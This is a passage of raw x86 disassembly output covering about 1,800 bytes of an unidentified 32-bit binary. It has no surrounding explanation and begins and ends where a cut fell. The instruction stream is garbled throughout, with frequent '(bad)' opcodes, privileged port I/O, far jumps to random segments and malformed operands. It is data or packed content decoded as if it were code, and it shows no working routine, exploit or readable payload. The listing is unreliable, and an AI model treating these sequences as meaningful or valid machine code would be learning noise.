  41c983:	jns    0x41c951
  41c985:	sbb    BYTE PTR [eax+0x4a02f91c],cl
  41c98b:	add    ebp,DWORD PTR [ecx+0x7e82c86d]
  41c991:	fnstcw WORD PTR [ebp-0x58]
  41c994:	ss jecxz 0x41c93e
  41c997:	add    al,0x31
  41c999:	retf   0x86a5
  41c99c:	push   eax
  41c99d:	es dec eax
  41c99f:	outs   dx,BYTE PTR ds:[esi]
  41c9a0:	add    DWORD PTR [edx+eiz*2+0x65],0x56
  41c9a5:	adc    al,0x66
  41c9a7:	repnz inc esp
  41c9a9:	cmp    ecx,DWORD PTR [ebx-0x17]
  41c9ac:	sbb    BYTE PTR [esi+eiz*8+0x2c],al
  41c9b0:	add    dl,BYTE PTR [ebp+ebp*8-0x15]
  41c9b4:	pop    ebx
  41c9b5:	sbb    DWORD PTR [ecx],ebx
  41c9b7:	xlat   BYTE PTR ds:[ebx]
  41c9b8:	inc    eax
  41c9b9:	pop    ss
  41c9ba:	je     0x41c9bd
  41c9bc:	pop    edx
  41c9bd:	pop    ebp
  41c9be:	in     al,dx
  41c9bf:	(bad)  
  41c9c0:	or     BYTE PTR [eax-0x487698eb],ch
  41c9c6:	ins    DWORD PTR es:[edi],dx
  41c9c7:	loop   0x41c9e2
  41c9c9:	jae    0x41c97c
  41c9cb:	push   ebx
  41c9cc:	jg     0x41c978
  41c9ce:	jmp    0x97cbc684
  41c9d3:	stos   BYTE PTR es:[edi],al
  41c9d4:	pop    ss
  41c9d5:	test   DWORD PTR [edi],ebp
  41c9d7:	dec    eax
  41c9d8:	icebp  
  41c9d9:	fst    QWORD PTR [esi-0x69993bd3]
  41c9df:	cs aam 0xdd
  41c9e2:	fcos   
  41c9e4:	stos   DWORD PTR es:[edi],eax
  41c9e5:	sbb    ecx,DWORD PTR [edx+ecx*4-0x2b9dc4c3]
  41c9ec:	and    al,0x93
  41c9ee:	jmp    0xa30cf34f
  41c9f3:	out    dx,al
  41c9f4:	cmp    esi,ebx
  41c9f6:	fimul  WORD PTR [eax]
  41c9f8:	leave  
  41c9f9:	(bad)  
  41c9fa:	aam    0xd8
  41c9fc:	sub    DWORD PTR ds:0x20a0cc55,esp
  41ca02:	fwait
  41ca03:	aaa    
  41ca04:	shl    BYTE PTR [ebp+0x7f056648],cl
  41ca0a:	js     0x41c9e2
  41ca0c:	dec    ecx
  41ca0d:	outs   dx,BYTE PTR ds:[esi]
  41ca0e:	fld    DWORD PTR [ebx-0x65]
  41ca11:	mov    dl,dh
  41ca13:	aad    0x8d
  41ca15:	bound  ebp,QWORD PTR [edi+0xc]
  41ca18:	mov    esi,0xf8f75942
  41ca1d:	out    dx,al
  41ca1e:	fadd   DWORD PTR [ebx]
  41ca20:	lods   eax,DWORD PTR ds:[esi]
  41ca21:	jg     0x41c9df
  41ca23:	pop    esp
  41ca24:	sbb    ebx,esi
  41ca26:	cmp    al,0x5f
  41ca28:	pop    esi
  41ca29:	pop    edi
  41ca2a:	out    dx,al
  41ca2b:	adc    al,BYTE PTR [edx+eax*1+0x7ade5b49]
  41ca32:	dec    edi
  41ca33:	mov    ch,0xa1
  41ca35:	mov    DWORD PTR [edi-0x40],ebp
  41ca38:	xlat   BYTE PTR ds:[ebx]
  41ca39:	add    al,BYTE PTR [eax+0x27c7dce6]
  41ca3f:	pop    ebx
  41ca40:	fdivr  st(0),st
  41ca42:	or     ah,BYTE PTR [ebx]
  41ca44:	test   eax,0x53f225d6
  41ca49:	xor    ebp,DWORD PTR [eax]
  41ca4b:	mov    esp,0x5c6335e1
  41ca50:	mov    bh,0x87
  41ca52:	jmp    0x41ca7a
  41ca54:	dec    BYTE PTR ds:0xbc2be3bc
  41ca5a:	jmp    0x41ca44
  41ca5c:	mov    cl,0x34
  41ca5e:	mov    eax,0xbc7dffda
  41ca63:	mov    ds:0x3558c25e,eax
  41ca68:	jecxz  0x41ca07
  41ca6a:	xchg   DWORD PTR [eax-0x4a],esi
  41ca6d:	push   0x44d68ebf
  41ca72:	out    0xb2,eax
  41ca74:	mov    esi,0xe6b96114
  41ca79:	pop    eax
  41ca7a:	push   0x43
  41ca7c:	(bad)  
  41ca7d:	mov    ah,BYTE PTR [esi-0x3c1a1348]
  41ca83:	ror    DWORD PTR [esi+0x64],1
  41ca86:	and    BYTE PTR [ecx],bh
  41ca88:	jecxz  0x41ca36
  41ca8a:	and    eax,0x793a6b0c
  41ca8f:	inc    esi
  41ca90:	shr    ch,0x29
  41ca93:	shl    BYTE PTR [edi+ecx*4+0x10444bf4],cl
  41ca9a:	jecxz  0x41cb13
  41ca9c:	inc    eax
  41ca9d:	gs test eax,0xef7ff3f8
  41caa3:	push   esi
  41caa4:	(bad)
  41caa8:	mov    eax,ds:0x4db70f61
  41caad:	pop    ds
  41caae:	push   ds
  41caaf:	jmp    0x41cb15
  41cab1:	dec    ebp
  41cab2:	cld    
  41cab3:	jno    0x41cb18
  41cab5:	jns    0x41cb0f
  41cab7:	es hlt 
  41cab9:	add    al,0x3d
  41cabb:	xor    BYTE PTR [ecx],al
  41cabd:	push   ss
  41cabe:	cmp    bl,ch
  41cac0:	stos   DWORD PTR es:[edi],eax
  41cac1:	mov    ah,BYTE PTR [ebx]
  41cac3:	jns    0x41ca9c
  41cac5:	mov    ?,WORD PTR [eax+eax*4-0x7ea0f918]
  41cacc:	mov    ax,ds:0xd3c0c16
  41cad2:	cmp    DWORD PTR [edx+0x51],eax
  41cad5:	dec    edx
  41cad6:	sahf   
  41cad7:	loopne 0x41ca82
  41cad9:	jne    0x41cae7
  41cadb:	rcl    DWORD PTR [esi-0x12],1
  41cade:	dec    ecx
  41cadf:	inc    ebx
  41cae0:	aaa    
  41cae1:	dec    ebx
  41cae2:	outs   dx,BYTE PTR ds:[esi]
  41cae3:	or     al,0xca
  41cae5:	push   esp
  41cae6:	rcl    BYTE PTR [ebx],cl
  41cae8:	lods   al,BYTE PTR ds:[esi]
  41cae9:	mov    bl,BYTE PTR [esi+edx*8-0x144763fd]
  41caf0:	outs   dx,BYTE PTR ds:[esi]
  41caf1:	pop    eax
  41caf2:	cmp    eax,0x124bbc1c
  41caf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf8:	pop    esp
  41caf9:	test   BYTE PTR [ebp+0x14],ch
  41cafc:	popf   
  41cafd:	or     eax,DWORD PTR [ebp+0x7e64ab88]
  41cb03:	stos   DWORD PTR es:[edi],eax
  41cb04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb05:	add    edx,ecx
  41cb07:	adc    edx,ecx
  41cb09:	call   0x3e83:0x55897f3c
  41cb10:	stc    
  41cb11:	imul   esi,DWORD PTR [ecx],0xffffffb0
  41cb14:	pop    es
  41cb15:	pop    esp
  41cb16:	xchg   ecx,eax
  41cb17:	(bad)  
  41cb18:	xor    al,0xfa
  41cb1a:	xlat   BYTE PTR ds:[ebx]
  41cb1b:	(bad)  
  41cb1c:	(bad)  
  41cb1d:	imul   esi,DWORD PTR [edx+0x4d],0xffffff95
  41cb21:	or     bl,BYTE PTR [ecx]
  41cb23:	shl    BYTE PTR [edi-0x3cce4cde],1
  41cb29:	leave  
  41cb2a:	sbb    al,0x95
  41cb2c:	mov    dl,0x80
  41cb2e:	(bad)  
  41cb2f:	pop    edi
  41cb30:	inc    edx
  41cb31:	push   ebx
  41cb32:	rcr    BYTE PTR [edx-0x17],1
  41cb35:	push   cs
  41cb36:	aaa    
  41cb37:	inc    edx
  41cb38:	jae    0x41cb62
  41cb3a:	cmp    DWORD PTR [ebx+0x38],esi
  41cb3d:	jno    0x41cb74
  41cb3f:	mov    al,ds:0xc170ad69
  41cb44:	xchg   BYTE PTR [ebx+0x57],dl
  41cb47:	mov    bh,0x78
  41cb49:	mov    al,0xe7
  41cb4b:	or     BYTE PTR [edx],dh
  41cb4d:	out    0x6,al
  41cb4f:	push   cs
  41cb50:	inc    esi
  41cb51:	(bad)  
  41cb52:	(bad)  
  41cb53:	sub    cl,BYTE PTR [ecx-0x67c5f1ea]
  41cb59:	ror    BYTE PTR [ebp+0x54],1
  41cb5c:	loop   0x41cbca
  41cb5e:	cmp    BYTE PTR [esi-0x24d4ae0c],cl
  41cb64:	dec    ecx
  41cb65:	mov    ebx,0x1deb7779
  41cb6a:	adc    al,0xb5
  41cb6c:	into   
  41cb6d:	lds    esp,FWORD PTR [esi+0x2564e10e]
  41cb73:	fistp  WORD PTR [edi+edx*1+0x5efd5ed6]
  41cb7a:	ja     0x41cb2b
  41cb7c:	(bad)  
  41cb7d:	out    0xdc,al
  41cb7f:	cmp    eax,0xd9db05ec
  41cb84:	int3   
  41cb85:	pop    ebx
  41cb86:	in     al,dx
  41cb87:	mov    eax,0x9a7221a8
  41cb8c:	je     0x41cbbf
  41cb8e:	shl    DWORD PTR ds:0xfecf2012,0x70
  41cb95:	push   0xe1057010
  41cb9a:	mov    dh,0x83
  41cb9c:	dec    ecx
  41cb9d:	arpl   WORD PTR [ebx+ecx*2+0x30],ax
  41cba1:	sbb    esp,DWORD PTR [ebx+0x59]
  41cba4:	test   cl,0x59
  41cba7:	fmul   st,st(4)
  41cba9:	fld    QWORD PTR [ebx-0x53dbe740]
  41cbaf:	shl    esp,0xb0
  41cbb2:	shl    BYTE PTR [edi],cl
  41cbb4:	stos   BYTE PTR es:[edi],al
  41cbb5:	mov    ch,0x67
  41cbb7:	popf   
  41cbb8:	cmp    DWORD PTR [esi],0xf28f8013
  41cbbe:	cmp    esp,DWORD PTR [ebx]
  41cbc0:	outs   dx,DWORD PTR ds:[esi]
  41cbc1:	stos   BYTE PTR es:[edi],al
  41cbc2:	loop   0x41cb4d
  41cbc4:	pop    esp
  41cbc5:	iret   
  41cbc6:	retf   
  41cbc7:	mov    al,ch
  41cbc9:	mov    eax,ds:0xb6615a35
  41cbce:	inc    esp
  41cbcf:	xchg   ebx,eax
  41cbd0:	adc    DWORD PTR [eax+0x7c],0x260655df
  41cbd7:	cmp    DWORD PTR [ecx],ebp
  41cbd9:	inc    edx
  41cbda:	mov    ebp,ds
  41cbdc:	mov    ecx,ds
  41cbde:	push   0x16717009
  41cbe3:	ja     0x41cbc8
  41cbe5:	mov    bl,0xb6
  41cbe7:	int    0x9a
  41cbe9:	mov    eax,ds:0xb41d2312
  41cbee:	mov    ch,0x18
  41cbf0:	int3   
  41cbf1:	sub    bh,bh
  41cbf3:	std    
  41cbf4:	test   eax,0x2441fd22
  41cbf9:	sub    eax,0x669eb249
  41cbfe:	cmp    esp,ebx
  41cc00:	outs   dx,DWORD PTR ds:[esi]
  41cc01:	inc    ebp
  41cc02:	mov    bh,0xcd
  41cc04:	hlt    
  41cc05:	xchg   esi,eax
  41cc06:	jmp    0x42c7:0x8a833c11
  41cc0d:	mov    ?,ecx
  41cc0f:	sub    edx,eax
  41cc11:	xor    eax,edx
  41cc13:	push   esi
  41cc14:	enter  0x8c7,0x27
  41cc18:	es mov dl,0xec
  41cc1b:	rcl    BYTE PTR [edi+eax*8],1
  41cc1e:	and    bh,cl
  41cc20:	inc    ebp
  41cc21:	cmp    ebp,edx
  41cc23:	es cli 
  41cc25:	cmc    
  41cc26:	jg     0x41cc1b
  41cc28:	xchg   edx,eax
  41cc29:	out    dx,eax
  41cc2a:	dec    ebp
  41cc2b:	and    eax,0x3934ee3c
  41cc30:	dec    edi
  41cc31:	jge    0x41cc51
  41cc33:	adc    eax,DWORD PTR ds:0x86b2ab2c
  41cc39:	jge    0x41cc07
  41cc3b:	jge    0x41cbca
  41cc3d:	sub    dh,BYTE PTR [ebx-0x4e1939ef]
  41cc43:	mov    bh,0xff
  41cc45:	aad    0x86
  41cc47:	mov    edi,0x18556d8c
  41cc4c:	sar    BYTE PTR [ebp+0x116081bc],cl
  41cc52:	xchg   edi,ebp
  41cc54:	mov    fs,WORD PTR [edi]
  41cc56:	jne    0x41cbe2
  41cc58:	loope  0x41cc2e
  41cc5a:	mov    fs,WORD PTR [ecx]
  41cc5c:	mov    bh,0x76
  41cc5e:	not    DWORD PTR [ecx+0x4c25c02e]
  41cc64:	lods   al,BYTE PTR ds:[esi]
  41cc65:	pop    ecx
  41cc66:	in     eax,dx
  41cc67:	gs ins DWORD PTR es:[edi],dx
  41cc69:	gs sub eax,0x55b6b774
  41cc6f:	(bad)  
  41cc70:	cmp    al,0x75
  41cc72:	repz (bad) 
  41cc75:	fmul   st,st(6)
  41cc77:	adc    DWORD PTR [edi+0x7033c44a],esi
  41cc7d:	lds    ebp,FWORD PTR [edi-0x4b3a88bc]
  41cc83:	or     esi,edi
  41cc85:	(bad)  
  41cc86:	xlat   BYTE PTR ds:[ebx]
  41cc87:	repz inc esi
  41cc89:	pop    esp
  41cc8a:	scas   al,BYTE PTR es:[edi]
  41cc8b:	mov    dh,BYTE PTR [ecx]
  41cc8d:	in     al,dx
  41cc8e:	jge    0x41cce2
  41cc90:	or     eax,0xb678d63c
  41cc95:	sub    bh,dh
  41cc97:	push   edx
  41cc98:	(bad)  
  41cc9a:	mov    ecx,0x15b74bc
  41cc9f:	sbb    eax,0xe90d92c
  41cca4:	pop    ebx
  41cca5:	xor    eax,0xdabce8bf
  41ccaa:	mov    al,0x51
  41ccac:	or     eax,0x9772d938
  41ccb1:	sbb    al,0x87
  41ccb3:	(bad)  
  41ccb4:	xlat   BYTE PTR ds:[ebx]
  41ccb5:	sub    bh,BYTE PTR [edi]
  41ccb7:	scas   al,BYTE PTR es:[edi]
  41ccb8:	rol    ch,1
  41ccba:	ds cmp al,cl
  41ccbd:	cmp    ah,bh
  41ccbf:	or     dl,bl
  41ccc1:	push   0x6b
  41ccc3:	mov    ch,0x87
  41ccc5:	test   BYTE PTR [edx+0x17],dl
  41ccc8:	jp     0x41cc89
  41ccca:	jo     0x41ccf4
  41cccc:	fimul  WORD PTR [ebp-0x32d27972]
  41ccd2:	add    edi,DWORD PTR [edi]
  41ccd4:	stc    
  41ccd5:	xchg   edi,eax
  41ccd6:	cmp    eax,0x8b2859f0
  41ccdb:	mov    ah,0x88
  41ccdd:	ret    0x4bba
  41cce0:	loop   0x41ccc0
  41cce2:	add    eax,0xdcacd01c
  41cce7:	fld    DWORD PTR [ebx-0x5]
  41ccea:	mov    dh,0x22
  41ccec:	aad    0x1d
  41ccee:	xor    ax,0x6
  41ccf2:	in     eax,dx
  41ccf3:	(bad)  
  41ccf4:	sbb    BYTE PTR ds:0xdcd797b7,ah
  41ccfa:	aad    0xaf
  41ccfc:	inc    esi
  41ccfd:	lods   al,BYTE PTR ds:[esi]
  41ccfe:	mov    eax,gs:0x51ca3bd2
  41cd04:	fmul   DWORD PTR [eax]
  41cd06:	imul   eax,DWORD PTR [edi+0x428bba6b],0x9b98ecf1
  41cd10:	sbb    ebx,DWORD PTR [edi]
  41cd12:	inc    esp
  41cd13:	data16 jecxz 0x41cd61
  41cd16:	icebp  
  41cd17:	xchg   ecx,eax
  41cd18:	hlt    
  41cd19:	repnz push edx
  41cd1b:	pushf  
  41cd1c:	sub    al,0x88
  41cd1e:	into   
  41cd1f:	push   esi
  41cd20:	int3   
  41cd21:	shr    cl,0xc7
  41cd24:	cmc    
  41cd25:	dec    eax
  41cd26:	sbb    eax,0x29d383dc
  41cd2b:	ja     0x41cd5a
  41cd2d:	(bad)  
  41cd2e:	jb     0x41cdad
  41cd30:	sub    al,bh
  41cd32:	adc    esp,DWORD PTR [ecx]
  41cd34:	adc    BYTE PTR [eax+0x5d],ah
  41cd37:	imul   ebx,DWORD PTR [edi+0xd],0x1bfb11e7
  41cd3e:	stc    
  41cd3f:	fld    DWORD PTR [edx]
  41cd41:	test   DWORD PTR [edx+0x63],ebx
  41cd44:	mov    al,0x40
  41cd46:	adc    eax,0xcb6ce818
  41cd4b:	fs sub al,0xed
  41cd4e:	adc    DWORD PTR [edi+0x37],edi
  41cd51:	rcr    DWORD PTR [ebp+0x2c],1
  41cd54:	sub    ebx,eax
  41cd56:	retf   
  41cd57:	shl    DWORD PTR [ebp-0x55613c6],0xee
  41cd5e:	pop    edx
  41cd5f:	ins    DWORD PTR es:[edi],dx
  41cd60:	jge    0x41cd74
  41cd62:	test   BYTE PTR [esi+0x4d],dh
  41cd65:	jge    0x41cdd4
  41cd67:	inc    ebx
  41cd68:	xchg   BYTE PTR [edi-0x24],al
  41cd6b:	xor    eax,0x5416679b
  41cd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd71:	iret   
  41cd72:	sub    ah,BYTE PTR [ecx]
  41cd74:	in     al,dx
  41cd75:	mov    ?,eax
  41cd77:	mov    esi,0xe7b9c664
  41cd7c:	test   BYTE PTR [ebx],bh
  41cd7e:	mov    bh,ah
  41cd80:	nop
  41cd81:	jbe    0x41cd68
  41cd83:	fiadd  DWORD PTR [edx-0x2]
  41cd86:	jp     0x41cdd3
  41cd88:	ret    
  41cd89:	jb     0x41cdaa
  41cd8b:	jge    0x41cd4a
  41cd8d:	xor    edx,DWORD PTR [esi]
  41cd8f:	imul   edi,DWORD PTR [ebx-0x52a45053],0x59c933cc
  41cd99:	push   edx
  41cd9a:	mov    esi,edx
  41cd9c:	jo     0x41cdce
  41cd9e:	clc    
  41cd9f:	stos   BYTE PTR es:[edi],al
  41cda0:	div    esp
  41cda2:	mov    dh,0x75
  41cda4:	sbb    DWORD PTR [ebp+0x1a40daf7],eax
  41cdaa:	push   esi
  41cdab:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdad:	mov    edx,0x38cde80c
  41cdb2:	in     eax,0xab
  41cdb4:	in     eax,0xa1
  41cdb6:	out    0x5e,eax
  41cdb8:	xor    BYTE PTR [edi-0x7fec035e],dh
  41cdbe:	push   ss
  41cdbf:	sbb    eax,0x861a6646
  41cdc4:	sub    ebp,esp
  41cdc6:	add    eax,0x87600f38
  41cdcb:	ja     0x41cd76
  41cdcd:	mov    bh,0x57
  41cdcf:	clc    
  41cdd0:	lds    ecx,FWORD PTR [ecx]
  41cdd2:	and    eax,0xb8c91ed5
  41cdd7:	xor    al,0x21
  41cdd9:	jnp    0x41cd90
  41cddb:	stc    
  41cddc:	in     eax,0x95
  41cdde:	push   edx
  41cddf:	jb     0x41ce01
  41cde1:	push   ebx
  41cde2:	inc    esi
  41cde3:	outs   dx,DWORD PTR ds:[esi]
  41cde4:	gs pop ss
  41cde6:	push   edx
  41cde7:	dec    ebp
  41cde8:	and    BYTE PTR [edi],dl
  41cdea:	pop    ecx
  41cdeb:	dec    edi
  41cdec:	scas   al,BYTE PTR es:[edi]
  41cded:	ret    0xf09e
  41cdf0:	loop   0x41cdcd
  41cdf2:	xor    ebp,ecx
  41cdf4:	dec    ecx
  41cdf5:	cmc    
  41cdf6:	retf   
  41cdf7:	push   edi
  41cdf8:	icebp  
  41cdf9:	std    
  41cdfa:	and    BYTE PTR [ebp+0x522dc5ce],ah
  41ce00:	mov    ah,0x9e
  41ce02:	add    al,0x41
  41ce04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce05:	cmp    edx,edx
  41ce07:	sbb    edi,DWORD PTR [ebx]
  41ce09:	cmp    eax,0xe0e1d709
  41ce0e:	lahf   
  41ce0f:	push   0x4b489a1f
  41ce14:	(bad)  
  41ce16:	xor    eax,edx
  41ce18:	outs   dx,BYTE PTR ds:[esi]
  41ce19:	push   edx
  41ce1a:	mov    ch,0xa9
  41ce1c:	sub    ebp,DWORD PTR [edi+edx*1-0x559ad977]
  41ce23:	xor    dh,ch
  41ce25:	popf   
  41ce26:	and    edx,DWORD PTR [ebp-0x66]
  41ce29:	dec    ecx
  41ce2a:	scas   eax,DWORD PTR es:[edi]
  41ce2b:	xor    edi,DWORD PTR [eax]
  41ce2d:	mov    al,0xc0
  41ce2f:	jg     0x41ce06
  41ce31:	in     eax,dx
  41ce32:	bound  esp,QWORD PTR [esi+0x3f]
  41ce35:	xor    BYTE PTR [ebx+0x4d6fef2f],0x93
  41ce3c:	adc    BYTE PTR [ecx+0x2a],ch
  41ce3f:	xor    al,0xe1
  41ce41:	mov    DWORD PTR [eax+eax*1-0x25f37d2f],edi
  41ce48:	cdq    
  41ce49:	add    al,BYTE PTR [ebx]
  41ce4b:	rol    DWORD PTR [edx+0x9],cl
  41ce4e:	sub    eax,0xb9d7812b
  41ce53:	mov    ebp,0x52ca3c0f
  41ce58:	loope  0x41ce4b
  41ce5a:	fcomip st,st(0)
  41ce5c:	mov    cl,0x80
  41ce5e:	sbb    eax,0x42a381a4
  41ce63:	in     eax,0x17
  41ce65:	hlt    
  41ce66:	retf   0x365b
  41ce69:	jb     0x41ce71
  41ce6b:	dec    esp
  41ce6c:	sahf   
  41ce6d:	loope  0x41ceae
  41ce6f:	(bad)  
  41ce70:	es pop ss
  41ce72:	jle    0x41ce21
  41ce74:	pop    ds
  41ce75:	ins    BYTE PTR es:[edi],dx
  41ce76:	cmp    dl,cl
  41ce78:	test   BYTE PTR [ebx+edi*1],0xf9
  41ce7c:	shr    BYTE PTR [ebp+0x13ac1728],1
  41ce82:	mov    bl,0xc
  41ce84:	lea    edx,[edx-0x3768cc50]
  41ce8a:	inc    esi
  41ce8b:	(bad)  
  41ce8c:	pop    edi
  41ce8d:	repnz sbb eax,0x61392d5e
  41ce93:	sbb    ch,ch
  41ce95:	mov    al,ds:0xc0cb852b
  41ce9a:	je     0x41ce60
  41ce9c:	rcr    ah,1
  41ce9e:	mov    edi,0x6592a825
  41cea3:	imul   eax,DWORD PTR [edx],0x41af40cf
  41cea9:	cmp    ch,BYTE PTR [eax+0x6b62aa87]
  41ceaf:	xor    DWORD PTR [ebp-0x7cd9a8af],eax
  41ceb5:	jge    0x41cead
  41ceb7:	je     0x41cf1f
  41ceb9:	mov    esi,0xd47476e2
  41cebe:	fidiv  DWORD PTR [ebp-0x32]
  41cec1:	mov    eax,ds:0xbc5c9756
  41cec6:	ins    DWORD PTR es:[edi],dx
  41cec7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41cec9:	cmp    DWORD PTR [esp+ebp*4+0x5b90ec53],esp
  41ced0:	out    0xf8,eax
  41ced2:	daa    
  41ced3:	mov    ds:0x8cc4007e,al
  41ced8:	and    esp,esi
  41ceda:	mov    ?,WORD PTR ds:[edi]
  41cedd:	sahf   
  41cede:	popa   
  41cedf:	enter  0x77fa,0x69
  41cee3:	and    bh,ah
  41cee5:	sti    
  41cee6:	scas   eax,DWORD PTR es:[edi]
  41cee7:	es loop 0x41ce71
  41ceea:	shl    BYTE PTR [eax+0x46],1
  41ceed:	addr16 jmp 0xb421:0x7ae6d98b
  41cef5:	sub    ch,BYTE PTR [ebx]
  41cef7:	or     bh,BYTE PTR [esi+0x22]
  41cefa:	stos   BYTE PTR es:[edi],al
  41cefb:	jmp    0xcc94:0xd1eb6fc6
  41cf02:	or     eax,0x3b2bfdb7
  41cf07:	addr16 aas 
  41cf09:	into   
  41cf0a:	sbb    al,0xab
  41cf0c:	imul   eax,edi,0x47
  41cf0f:	xchg   edi,eax
  41cf10:	stos   BYTE PTR es:[edi],al
  41cf11:	inc    BYTE PTR [ecx]
  41cf13:	(bad)  
  41cf14:	adc    DWORD PTR [ebx-0x52],edi
  41cf17:	test   al,0x4d
  41cf19:	(bad)  
  41cf1a:	mov    edx,0x502ef00a
  41cf1f:	pop    edi
  41cf20:	mov    edi,0x5a0d5b2a
  41cf25:	sub    eax,DWORD PTR [ebx-0x14dc5a2]
  41cf2b:	loopne 0x41cfaa
  41cf2d:	or     BYTE PTR [ebp+0x1a],al
  41cf30:	mov    BYTE PTR [ecx-0x38],ch
  41cf33:	push   cs
  41cf34:	jl     0x41cf11
  41cf36:	cdq    
  41cf37:	mov    WORD PTR [ecx],ss
  41cf39:	or     BYTE PTR [edi+0x2f],0x90
  41cf3d:	dec    ecx
  41cf3e:	test   al,0xb4
  41cf40:	pop    esi
  41cf41:	dec    esp
  41cf42:	repnz adc eax,0xd428e241
  41cf48:	ficom  WORD PTR [eax+0x3f]
  41cf4b:	xchg   ebp,eax
  41cf4c:	aaa    
  41cf4d:	repz push edi
  41cf4f:	mov    gs:0x5858ef56,al
  41cf55:	xor    al,0x9e
  41cf57:	add    eax,0xa7928bef
  41cf5c:	sbb    eax,0x7cd90703
  41cf61:	mov    cl,0x1f
  41cf63:	call   0x29d8856d
  41cf68:	jp     0x41cf46
  41cf6a:	hlt    
  41cf6b:	cld    
  41cf6c:	cmp    ebx,eax
  41cf6e:	out    0xd4,eax
  41cf70:	ja     0x41cfc9
  41cf72:	in     eax,0x32
  41cf74:	mov    WORD PTR ds:0xe9236d12,?
  41cf7a:	dec    ecx
  41cf7b:	ds fwait
  41cf7d:	lods   al,BYTE PTR ds:[esi]
  41cf7e:	pop    edi
  41cf7f:	shr    dh,cl
  41cf81:	test   al,0xff
  41cf83:	cwde   
  41cf84:	ins    DWORD PTR es:[edi],dx
  41cf85:	sahf   
  41cf86:	sar    BYTE PTR [eax+0x3f],1
  41cf89:	jnp    0x41cf5e
  41cf8b:	fiadd  DWORD PTR [ebx+0x47eae29b]
  41cf91:	xor    ch,dl
  41cf93:	aaa    
  41cf94:	mov    bh,0x7f
  41cf96:	stos   BYTE PTR es:[edi],al
  41cf97:	lea    ecx,[ecx+0x53]
  41cf9a:	sbb    DWORD PTR [ebx],0x6b
  41cf9d:	xor    ebp,DWORD PTR ss:[ebx]
  41cfa0:	hlt    
  41cfa1:	imul   ecx,DWORD PTR [ebx],0x162c2f66
  41cfa7:	or     cl,BYTE PTR [ecx-0xf]
  41cfaa:	nop
  41cfab:	mov    eax,ds:0x4ae6b809
  41cfb0:	call   0xdd13:0xae0d03a2
  41cfb7:	loopne 0x41cfe4
  41cfb9:	loope  0x41cfcc
  41cfbb:	stc    
  41cfbc:	sub    BYTE PTR ds:0xbd72cfcf,cl
  41cfc2:	shl    DWORD PTR [edx],0x8d
  41cfc5:	add    DWORD PTR [ebx+0x16],edx
  41cfc8:	call   0x47657d2e
  41cfcd:	cmp    DWORD PTR [eax+0x59],ebx
  41cfd0:	mov    fs,WORD PTR [esi]
  41cfd2:	out    dx,al
  41cfd3:	pop    ebx
  41cfd4:	sbb    BYTE PTR [eax-0x723b2ef7],0x8f
  41cfdb:	cmp    DWORD PTR [esi*2+0x72201ef6],ecx
  41cfe2:	pop    edi
  41cfe3:	mov    al,ds:0x17bae456
  41cfe8:	push   edx
  41cfe9:	test   DWORD PTR [ebp+edi*1-0x3a473634],edx
  41cff0:	es jmp 0x7ff5107f
  41cff6:	in     eax,0x7f
  41cff8:	add    ebp,DWORD PTR [eax+ebx*1-0x553e4ae9]
  41cfff:	xchg   DWORD PTR [ebp+0x527b654e],ebx
  41d005:	stos   DWORD PTR es:[edi],eax
  41d006:	fld    DWORD PTR [esi]
  41d008:	ja     0x41cfa6
  41d00a:	outs   dx,BYTE PTR ds:[esi]
  41d00b:	xor    dl,bl
  41d00d:	push   esp
  41d00e:	mov    WORD PTR [eax-0x4e6372c4],ss
  41d014:	lods   al,BYTE PTR ds:[esi]
  41d015:	or     BYTE PTR [ebx+esi*8-0x6fc020f8],0x66
  41d01d:	pop    esi
  41d01e:	stos   DWORD PTR es:[edi],eax
  41d01f:	lods   eax,DWORD PTR ds:[esi]
  41d020:	pop    esi
  41d021:	push   ss
  41d022:	dec    esp
  41d023:	fild   DWORD PTR [esi-0x67]
  41d026:	fwait
  41d027:	pop    esp
  41d028:	mov    edx,0x800436e5
  41d02d:	ins    DWORD PTR es:[edi],dx
  41d02e:	aas    
  41d02f:	inc    ebx
  41d030:	inc    edi
  41d031:	mov    dh,ch
  41d033:	pop    ecx
  41d034:	hlt    
  41d035:	sub    ecx,DWORD PTR [edi-0x49]
  41d038:	rol    BYTE PTR [edi-0x42],1
  41d03b:	hlt    
  41d03c:	scas   eax,DWORD PTR es:[edi]
  41d03d:	sub    BYTE PTR [ecx+edi*1],ch
  41d040:	cld    
  41d041:	stc    
  41d042:	pop    es
  41d043:	stos   BYTE PTR es:[edi],al
  41d044:	add    bl,bh
  41d046:	jbe    0x41d00d
  41d048:	dec    esp
  41d049:	pop    esp
  41d04a:	jnp    0x41d085
  41d04c:	adc    al,0xcd
  41d04e:	sbb    al,0x7f
  41d050:	rcr    DWORD PTR [esi+ecx*4-0x3beddd9e],cl
  41d057:	cmp    cl,BYTE PTR [edi]
  41d059:	stos   BYTE PTR es:[edi],al
  41d05a:	jae    0x41d022
  41d05c:	loope  0x41d04f
  41d05e:	mov    edx,0xbe9f919a
  41d063:	push   es
  41d064:	add    esp,ebp
  41d066:	cdq    
  41d067:	je     0x41d0cb
  41d069:	je     0x41d084
  41d06b:	(bad)  [ecx]
  41d06d:	and    DWORD PTR [ecx+0x35],ebp
  41d070:	xor    BYTE PTR [esi-0x1a],bl
  41d073:	pop    ebp
  41d074:	ret    
  41d075:	mov    bh,0x8
  41d077:	mov    ah,0xa8
  41d079:	lds    esp,FWORD PTR [edi-0x51]
  41d07c:	adc    eax,0x10d7e6b0
  41d081:	call   0x37d1dbae
  41d086:	push   0x63
  41d088:	mov    eax,ds:0x8d212eed
  41d08d:	loop   0x41d04f
  41d08f:	dec    eax
  41d090:	scas   eax,DWORD PTR es:[edi]
  41d091:	fsub   DWORD PTR [edi]
  41d093:	pusha  
  41d094:	inc    edx
  41d095:	dec    edx
  41d096:	pop    edx
  41d097:	jns    0x41d041
  41d099:	daa    
  41d09a:	pop    ecx
  41d09b:	loope  0x41d0ed
  41d09d:	xchg   ecx,eax
  41d09e:	push   0x55578cb8
  41d0a3:	aas    
  41d0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0a5:	test   BYTE PTR [edx+0x21],al
  41d0a8:	dec    ebx
  41d0a9:	xor    al,0x66
  41d0ab:	pop    ss
  41d0ac:	lock inc esp
